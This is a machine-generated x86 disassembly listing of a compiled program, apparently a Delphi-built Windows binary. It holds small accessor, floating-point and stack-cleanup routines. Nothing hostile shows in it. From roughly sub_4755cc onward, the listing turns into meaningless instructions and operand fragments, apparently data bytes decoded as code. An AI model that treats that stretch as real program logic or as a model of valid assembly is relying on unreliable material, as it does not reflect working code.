call sub_46ae80
sub_46c467
jmp sub_4038ec
sub_46c46e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c4b8
lea ecx [ eax + 0x70 ]
xchg edx ecx
call sub_46b780
retn
sub_46c4c4
call sub_4628b4
retn
sub_46c4cc
add esp 0xfffffff8
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_46c4e4
add esp 0xfffffff8
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_46c5b0
push ebx
mov ebx eax
mov eax [ ebx + 0x3c ]
call sub_41418c
mov eax ebx
call sub_46ae80
pop ebx
retn
sub_46c79c
mov ecx [ eax ]
call [ ecx + 0x5c ]
retn
sub_46c89c
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_46c924
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_46c92c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_46caf4
push esi
mov esi eax
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46cb04
xor eax eax
mov [ edx + 0x38 ] eax
mov [ edx + 0x3c ] eax
retn
sub_46cb10
lea ecx [ eax + 0x34 ]
xchg edx ecx
call sub_46c148
retn
sub_46cb1c
add esp 0xfffffff8
mov eax [ eax + 0x84 ]
call sub_468e50
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_46cb34
add esp 0xfffffff8
mov eax [ eax + 0x8c ]
call sub_468e50
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_46cb4c
add esp 0xfffffff8
mov eax [ eax + 0x84 ]
call sub_468e78
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_46cb64
add esp 0xfffffff8
mov eax [ eax + 0x8c ]
call sub_468e78
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_46cc43
jmp sub_4038ec
sub_46cc4a
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46cc74
push ebx
mov ebx eax
mov eax [ ebx + 0x48 ]
call sub_4141dc
mov eax ebx
call sub_46a6d0
pop ebx
retn
sub_46cc88
mov ecx [ eax + 0x60 ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_4141dc
sub_46cd74
mov al 0x1
retn
sub_46ce1b
jmp sub_4038ec
sub_46ce22
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46cf1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_414098
pop esi
pop ebx
retn
sub_46d114
lea ecx [ eax + 0x338 ]
xchg edx ecx
call sub_461550
retn
sub_46d2eb
jmp sub_4038ec
sub_46d2f2
pop edi
pop esi
pop ecx
pop ebp
retn
sub_46d794
add esp 0xfffffff8
push 0x1
xor ecx ecx
call sub_46d47c
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_46d7ac
add esp 0xfffffff8
push 0x0
xor ecx ecx
call sub_46d47c
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_46d7c4
add esp 0xfffffff8
push 0x1
mov cl 0x1
call sub_46d47c
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_46d7dc
add esp 0xfffffff8
push 0x0
mov cl 0x1
call sub_46d47c
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_46d8c4
jmp sub_4038ec
sub_46d8cb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d99f
jmp sub_4038ec
sub_46d9a6
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e2c0
lea ecx [ eax + 0x300 ]
xchg edx ecx
call sub_461550
retn
sub_46e320
retn
sub_46e324
lea ecx [ eax + 0x301 ]
xchg edx ecx
call sub_461550
retn
sub_46e334
mov eax [ eax + 0x2f8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_46e340
mov eax [ eax + 0x2ec ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_46e34c
mov eax [ eax + 0x2fc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_46e358
mov eax [ eax + 0x2f0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_46e364
mov eax [ eax + 0x2f4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_46e428
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_46e548
lea ecx [ eax + 0x302 ]
xchg edx ecx
call sub_461550
retn
sub_46e60a
jmp sub_4038ec
sub_46e611
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e78d
jmp sub_4038ec
sub_46e794
pop ebp
retn
sub_46e990
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
0x46 0x0
sub_46f010
push ebp
mov ebp esp
add esp 0xfffffff8
fld [ ebp + 0x10 ]
fsub [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x10
sub_46f02c
push ebp
mov ebp esp
add esp 0xfffffff8
fld [ ebp + 0x10 ]
fmul [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x10
j_sub_4038ec#9
jmp sub_4038ec
sub_46f400
pop ebp
retn
sub_46f404
sub [ rw-data ] 0x1
retn
sub_46f441
xor eax [ eax ]
hlt
sub_46f57d
xor eax [ eax ]
hlt
sub_46f75d
xor eax [ eax ]
hlt
sub_46f8e9
xor eax [ eax ]
hlt
sub_470203
jmp ecx
sub_47130d
xor eax [ eax ]
hlt
sub_471369
xor eax [ eax ]
hlt
sub_4714dc
mov edx [ eax + 0x4 ]
cmp edx [ eax + 0x1c ]
setne al
retn
sub_471568
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_471574
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_471580
lea ecx [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
xchg edx ecx
call sub_4614d8
retn
sub_4715a0
lea ecx [ eax + 0xc ]
mov eax [ eax + 0x18 ]
xchg edx ecx
call sub_461550
retn
j_sub_4038ec#8
jmp sub_4038ec
sub_47176f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4717b8
push esi
mov esi eax
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
call sub_462288
pop esi
retn
sub_4717cc
lea ecx [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
xchg edx ecx
call sub_461550
retn
sub_4717dc
lea ecx [ eax + 0xc ]
mov eax [ eax + 0x4 ]
xchg edx ecx
call sub_461550
retn
sub_4717ec
cmp dl [ eax + 0xd ]
je r-xdata
retn
mov [ eax + 0xd ] dl
call sub_462288
sub_4717fc
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_471808
lea ecx [ eax + 0x14 ]
mov eax [ eax + 0x4 ]
xchg edx ecx
call sub_46153c
retn
sub_471818
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
j_sub_4038ec#7
jmp sub_4038ec
sub_471d78
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4038ec#6
jmp sub_4038ec
sub_471f13
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_471fa0
mov eax [ eax + 0x3b8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_471fac
lea ecx [ eax + 0x350 ]
xchg edx ecx
call sub_461550
retn
sub_471fbc
mov eax [ eax + 0x35c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_472040
push esi
mov esi eax
mov eax [ esi + 0x364 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47213c
mov eax [ eax + 0x354 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_472148
mov edx [ eax + 0x354 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_47215c
mov eax [ eax + 0x354 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47221c
mov eax [ eax + 0x360 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_472228
mov eax [ eax + 0x358 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_472308
mov ecx [ eax + 0x2b8 ]
cmp [ ecx + 0xc ] 0x0
je r-xdata
retn
cmp [ eax + 0x350 ] 0x0
jne r-xdata
xor ecx ecx
call sub_461e28
sub_47320c
push ebx
mov ebx eax
cmp [ ebx + 0x368 ] 0x0
jne r-xdata
mov [ ebx + 0x368 ] 0x1
mov eax ebx
call sub_461c04
pop ebx
retn
lea edx [ ebx + 0x369 ]
mov eax ebx
call sub_4720fc
sub_473754
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4739ac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_473b7c
lea edx [ esi + 0x5c ]
mov ecx ebx
call sub_461550
pop esi
pop ebx
retn
sub_4739c8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_473b7c
lea edx [ esi + 0x2c ]
mov ecx ebx
call sub_461550
pop esi
pop ebx
retn
sub_4739e4
cmp dl [ eax + 0xc ]
je r-xdata
retn
mov [ eax + 0xc ] dl
call sub_462288
sub_4739f4
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_473a00
call sub_462288
retn
sub_473a08
call sub_462288
retn
j_sub_4038ec#5
jmp sub_4038ec
sub_473a83
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4038ec#4
jmp sub_4038ec
sub_473af6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_473afc
cmp dl [ eax + 0x50 ]
je r-xdata
retn
mov [ eax + 0x50 ] dl
call sub_462288
sub_473b0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_473b7c
lea edx [ ebx + 0x30 ]
mov ecx esi
call sub_461564
pop esi
pop ebx
retn
sub_473b28
push ebx
mov ebx eax
cmp dl [ ebx + 0x2d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2d ] dl
mov eax ebx
call sub_473c3c
mov eax ebx
call sub_462288
sub_473b44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_473b7c
lea edx [ ebx + 0x28 ]
mov ecx esi
call sub_461564
pop esi
pop ebx
retn
sub_473b60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_473b7c
lea edx [ ebx + 0x58 ]
mov ecx esi
call sub_461564
pop esi
pop ebx
retn
sub_473b80
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_473b7c
lea edx [ esi + 0x44 ]
mov ecx ebx
call sub_461550
pop esi
pop ebx
retn
sub_473b9c
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_473ba8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_473b7c
lea edx [ ebx + 0x14 ]
mov ecx esi
call sub_46153c
pop esi
pop ebx
retn
sub_473c30
jmp sub_4038ec
sub_473c37
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_473cec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_473b7c
lea edx [ ebx + 0x48 ]
mov ecx esi
call sub_46153c
pop esi
pop ebx
retn
sub_473d08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_473b7c
lea edx [ ebx + 0x4c ]
mov ecx esi
call sub_461564
pop esi
pop ebx
retn
sub_473d24
mov eax [ eax + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_473f24
jmp sub_4038ec
sub_473f2b
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4741f7
jmp sub_4038ec
sub_4741fe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_474a29
jmp sub_4038ec
sub_474a30
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_474b90
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_414098
pop esi
pop ebx
retn
sub_474c90
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
xor ecx ecx
xchg ecx eax
xchg edx ecx
call sub_474ba4
pop ebp
retn 0x4
sub_474cf2
jmp sub_4038ec
sub_474cf9
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4038ec#3
jmp sub_4038ec
sub_474d67
pop ebp
retn
sub_474ed0
jmp sub_4038ec
sub_474ed7
mov esp ebp
pop ebp
retn
sub_4755cc
push [ edx - 0x46 ]
pop edi
scasd [ edi ]
je r-xdata
lea ecx [ ecx + 0x6017dfdf ]
0xffff
pop ss
sahf
jecxz r-xdata
jmp [ esi + 0x30163f7a ]
sub_4756ba
push [ edx + 0x7a ]
aaa
add al [ eax ]
add [ edi - 0x3e96ea ] ch
[ edi + 0x6f ]
sub_4756db
[ edi + 0x6f ]
sub_4756ee
inc [ eax ]
imul edx [ ebx - 0x1 ] 0xba72ffff
shr [ edi - 0x39e8c68c ] cl
in al 0xff
jmp [ esi + 0x7af03f7a ]
sub_475733
push [ esi - 0x46 ]
pop es
push ss
pop es
retn 0xffff
sub_47573c
outsd
cmp [ edx - 0x4d566edd ] bh
mov dl 0x17
xchg esp eax

sub_475748
jmp [ eax + 0x3f7aa4a1 ]
sub_4757dc
inc esp
xor al 0x16
mov di 0xffff
outsd
outsd
int3
sub_4759a2
dec esp
aas
mov al [ 0xffffffffffd25716 ]
[ edi + 0x6f ]
sub_4759bf
jmp [ esi + 0x7bf03f7a ]
sub_475db8
dec esp
add [ eax - 0x458d046b ] ch
add ebp [ edi - r-xdata ]
[ edi + 0x6f ]
sub_475ddb
[ edi - 0x8bfea ]
sub_475de1
[ edi + 0x6f ]
sub_475e76
call [ edi + 0x398b3332 ]
push ss
test [ edx ] 0x6f6f0000
push ss
inc ebp
fcos
[ edi + 0x6f ]
sub_475ea6
[ edi - 0x59 ]
sub_475eb4
[ edi + 0x6f ]
sub_475ebb
[ edi + 0x6f ]
sub_475f35
[ edi - 0x69 ]
sub_475f42
fdivp st7
push [ esi - 0x47 ]

sub_475fe1
[ edi + 0x6f ]
sub_475fe9
int 0xff
[ edi + 0x6f ]
sub_476003
[ edi + 0x36 ]
sub_476025
[ edi + 0x6f ]
sub_476049
[ edi + 0x6f ]
sub_476065
out 0xff eax
[ edi + 0x74 ]
sub_47608f
[ edi + 0x6f ]
sub_4760d8
[ ecx + ebp * 4 + 0x24ccbb95 ]
sub_4760e3
[ edi ]
sub_4760e6
mov al [ ebx ]
int3
sub_476327
outsd
outsd
outsd
outsd
test al 0x76
mov edx 0x1624cc12
inc esi
retn
sub_47634f
[ ecx - 0x58dc458a ]
xchg ebp eax
rcl [ esi ] 0x1
dec esp
aam 0xff
[ edi - 0x52 ]
sub_476380
[ edi + 0x6f ]
sub_47638e
[ edi + 0x6f ]
sub_4763b9
[ edi + 0x6f ]
sub_4763c5
[ edi + 0x6f ]
sub_4763ee
[ edi + 0x6f ]
sub_476432
[ edi - 0x10 ]
sub_476442
jmp [ eax + 0x3ca13974 ]
sub_4768a4
push [ edx - 0x46 ]
or ebp [ edi - 0x75f445c8 ]
mov [ edx - 0x45c76673 ] ds
pop es
int3
sub_47695a
not esp
aaa
push ss
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ ecx + edi * 4 - 0x35 ] dh
xchg edi eax
retn
sub_476967
cmc
fsub [ edi - 0x30cea ]
[ edi + 0x6f ]
sub_476aba
push ss
aaa

sub_476abe
[ edi + 0x16 ]
sub_476ac4
[ edi + 0x6f ]
sub_476adf
[ edi + 0x6f ]
sub_476b17
call [ esi ]
dec eax
sar edi 0x1
[ edi - 0x3c ]
sub_476b2f
[ edi + 0x72 ]
sub_476b41
[ edi + 0x6f ]
sub_476b7f
[ edi + 0x6f ]
sub_476b82
outsd
outsd
outsd
outsd
outsd
outsd
outsd
jl r-xdata
lodsb [ esi ]
test eax 0xcd4617a8
idiv [ ebp - 0x1619ea ]
[ ecx + 0x97a0e74 ]
sub_476b9c
dec esp
push ss
hlt
sub_476be8
[ edi + 0x6f ]
sub_476bf1
0x7816ffff 0xffd1
sub_476c04
[ edi - 0x200c8 ]
sub_476c1a
inc [ eax ]
mov dh bh
pop ss
movsd [ edi ] [ esi ]
jmp r-xdata
sub_476c4e
[ edi ]
sub_476c51
mov ah [ ebx ]
add [ edx - 0x49e957ed ] cl
sar bh 0x1
[ edi + 0x6f ]
sub_476c5e
pop ss
lodsd [ esi ]
jmp r-xdata
sub_476c62
[ edi + 0x18116 ]
sub_476c78
[ edi + 0x6f ]
sub_476c7d
add edx [ edi ]
std
int 0xff
[ edi - 0x13f4e9 ]
sub_476c88
jmp [ esi + 0x27b272a6 ]
sub_476d34
push [ edx - 0x46 ]
aaa
push ss
int3
sub_476d64
push ss
retn
sub_476d66
fdivr st7
jmp [ eax + 0x43827699 ]
sub_477098
push [ edx - 0x56 ]
pop ss
pop ss
jmp sub_47708e
sub_4770a0
call [ ebp - 0x6d6a5877 ]
push ss
iretd
sub_477113
[ edi + 0x6f ]
sub_477116
outsd
outsd
outsd
int3
sub_477123
push ss
shl al 0xff
[ edi + 0x6f ]
sub_47712a
outsd
outsd
outsd
pop ss
pop esp
iretd
sub_47714b
jmp [ esi - 0xf02f884 ]
sub_4771d5
lea esp [ edi + 0x7ba7699 ]
int3
sub_477217
call [ esi ]
cdq
sar bh 0x1
[ edi - 0x57 ]
sub_47722e
[ edi + 0x6f ]
sub_4772a1
iretd
sub_4772a4
[ ecx + ebp * 4 - 0x22cbf ]
sub_4772be
[ edi - 0x67 ]
sub_4772c8
[ edi + 0x6f ]
sub_4772e5
[ edi + 0x6f ]
sub_477321
outsd
outsd
je r-xdata
add dl ch
push ebx
pop ss
hlt
sub_477381
[ edi - 0x6b ]
sub_4773c7
[ edi + 0x6f ]
sub_477431
cmp al 0x6f
pop ss
pop edx
adc al 0x0
add [ ebx + edi - 0x19 ] bh
push ss
in al dx
loopne r-xdata
[ edi + 0x6f ]
sub_477466
mov edi 0x13bb16af
add [ eax ] al
outsd
int3
sub_47788c
push [ esi - 0x7d ]
fucomi st3
test eax 0xffdd1017
jmp [ esi + 0x7bf03f7a ]
sub_477b8f
[ edi - 0x60 ]
sub_477bc0
[ edi + 0x7c ]
sub_477bd8
push [ ecx + eax + 0x17 ]
add bl [ eax + eax ]
add [ ebx + edi - 0xd ] bh
retn 0x159f
sub_477bed
call [ esi ]
pand mm7 mm7
[ edi + 0x6f ]
sub_477c1b
[ edi + 0x6f ]
sub_477c31
jmp [ esi + 0x7a03a276 ]
sub_477e8a
mov esp 0x4e7bf0b9
and al [ eax ]
add [ eax + 0x47 ] al
hlt
sub_477ee8
or esp [ edi + 0x9ba7699 ]
int3
sub_4780a0
push [ edx - 0x46 ]
mov ebx 0xffff3816
[ edi - 0x4 ]
sub_4780e2
[ edi + 0x6f ]
sub_4780eb
[ edi + 0x2c817 ]
sub_4781a4
[ edi + 0x6f ]
sub_4783a6
push ss
aad 0x2a
add [ eax ] al
outsd
cdq
jbe r-xdata
pop ss
int3
sub_47854a
[ edi + 0x6f ]
sub_47855c
push es
0x6f6fffff 0x6f6f
sub_47856b
[ edi + 0x6f ]
sub_47857f
[ edi + 0x6f ]
sub_4785d0
[ edi + 0x6f ]
sub_4785d9
dec eax
iretd
sub_478651
[ edi - 0x4 ]
sub_47865e
[ edi + 0x6f ]
sub_478678
[ edi + 0x6f ]
sub_478698
[ edi + edx * 4 - 0x40691df2 ]
sub_4786f7
[ ecx + ebp * 4 + 0x74a824cc ]
sub_478979
push ds
add [ eax ] al
int3
sub_478d65
push [ edx - 0x46 ]
daa
scasd [ edi ]
add [ edx + 0x27a27623 ] cl
add [ edx - 0x2ee857f1 ] cl
cmp [ eax ] al
add [ esi ] dl
int3
sub_478ef8
push ss
0x6f000023 0x956f
sub_479012
inc esi
add [ ebx ] 0x16
int3
sub_4792c3
[ edi - 0x59 ]
sub_479570
dec esp
aas
mov eax [ 0x43f16 ]
add [ eax ] al
push 0xffffff5b
int3
sub_4796ea
push [ edi + esi + 0x17 ]
cli
sbb al [ eax ]
add [ eax ] al
mov ebx ebx
out 0x74 eax
cmp [ edi ] edx
retn
sub_47975f
[ edi + 0x6f ]
sub_4797e1
dec eax
neg [ ecx + 0x7316367a ]
and al 0x0
add [ edi + 0x6f ] ch
int3
sub_479aba

sub_479b23

sub_479b3e
[ edi + 0x6f ]
sub_479b41
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
int3
sub_479dab
iretd
sub_479e10
[ edi + 0x6f ]
sub_479e78
push ss
mov esp 0x6f000049
outsd
outsd
outsd
outsd
outsd
outsd
outsd
scasb [ edi ]
inc esi
iretd
j_sub_4038ec#2
jmp sub_4038ec
sub_47a7b4
mov esp ebp
pop ebp
retn
sub_47a801
jmp sub_4038ec
sub_47a808
pop ebp
retn
sub_47a80c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_47a4fc
j_sub_4038ec
jmp sub_4038ec
sub_47a842
pop ebp
retn
